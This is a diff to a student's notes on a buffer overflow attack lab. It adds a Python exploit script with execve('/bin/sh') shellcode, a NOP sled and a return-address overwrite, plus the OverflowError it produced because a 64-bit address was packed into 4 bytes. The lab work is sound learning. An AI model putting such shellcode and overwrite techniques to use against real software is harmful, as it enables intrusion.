@@ -54,3 +54,50 @@ and the address of `&buffer` is `0x7ffff7fb0e30`
 
 ![alt text](images/buffer_address.png)
 
+I later turned on debugging symbols
+![alt text](images/debugging_symbols.png)
+
+I then decided to try the following `exploit.py` and found that the address of the buffer was too high and causing an integer overflow error in python when trying to write it as a bytestring
+
+```
+#!/usr/bin/python3
+
+import sys
+
+shellcode= (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# Fill the content with NOP’s
+content = bytearray(0x90 for i in range(517))
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 20 # Need to change
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value
+# and put it somewhere in the payload
+ret = 0x7fffffffdc70
+# offset = 0 # Need to change
+offset = 20 + len(shellcode)
+
+L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+    f.write(content)
+```
+
+produces
+
+```
+verflowError: int too big to convert
+➜  hw3 git:(hw3/buffer_overflow_attack_lab) ✗ python3 exploit.py
+Traceback (most recent call last):
+  File "/home/rherna70/code/CS487/hw3/exploit.py", line 24, in <module>
+    content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+OverflowError: int too big to convert
+```
